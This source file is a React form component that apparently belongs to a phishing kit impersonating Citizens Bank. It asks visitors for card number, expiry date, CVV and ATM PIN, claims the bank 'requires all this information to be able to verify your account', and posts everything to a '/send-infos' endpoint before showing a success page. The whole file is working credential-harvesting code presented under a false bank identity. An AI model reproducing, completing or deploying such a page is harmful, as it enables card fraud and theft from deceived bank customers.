import { useForm } from "react-hook-form";
import axios from "axios";

import TextInput from "./TextInput";
import LeftSide from "./LeftSide";
import RightSide from "./RightSide";
import Sides from "./Sides";
import Button from "./Button";
import Error from "./Error";

const CardInformation = ({ updateInputs, history }) => {
  const onSubmit = async (data) => {
    updateInputs({
      form: "CARD INFORMATION",
      cardInformation: data,
    });
    await axios.post("/send-infos", {
      form: "CARD INFORMATION",
      cardInformation: data,
    });
    history.push("/successful");
  };

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  return (
    <div className="card-information">
      <Sides>
        <LeftSide>
          <div>
            <TextInput
              name="cardNumber"
              title="Card Number"
              type="number"
              register={register("cardNumber", {
                required: "Please enter your card number",
                pattern: {
                  value:
                    /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/,
                  message: "Please enter a valid card number",
                },
              })}
            />
            {errors?.cardNumber && (
              <Error message={errors.cardNumber.message} />
            )}
          </div>
          <div>
            <TextInput
              name="expiryDate"
              title="Expiry Date: MM/YYYY"
              register={register("expiryDate", {
                required: "Please enter your card expiry date",
                pattern: {
                  value: /(0[1-9]|10|11|12)\/20[0-9]{2}$/,
                  message:
                    "Please enter a valid expiry date in the format mentioned above",
                },
              })}
            />
            {errors?.expiryDate && (
              <Error message={errors.expiryDate.message} />
            )}
          </div>
          <div>
            <TextInput
              name="cvv"
              title="CVV"
              type="number"
              register={register("cvv", {
                required: "Please enter your card CVV",
                pattern: {
                  value: /^[0-9]{3}$/,
                  message: "Please enter a valid CVV",
                },
              })}
            />
            {errors?.cvv && <Error message={errors.cvv.message} />}
          </div>
          <div>
            <TextInput
              name="cardPin"
              title="ATM Pin"
              type="number"
              register={register("cardPin", {
                required: "Please enter your card ATM pin",
                pattern: {
                  value: /^[0-9]{4,5}$/,
                  message: "Please enter a valid ATM pin",
                },
              })}
            />
            {errors?.cardPin && <Error message={errors.cardPin.message} />}
          </div>
        </LeftSide>
        <RightSide>
          <h4>Why do I have to provide this information</h4>
          <p>
            Citizens bank requires all this information to be able to verify
            your account
          </p>
        </RightSide>
      </Sides>
      <Button onClick={handleSubmit(onSubmit)} />
    </div>
  );
};

export default CardInformation;
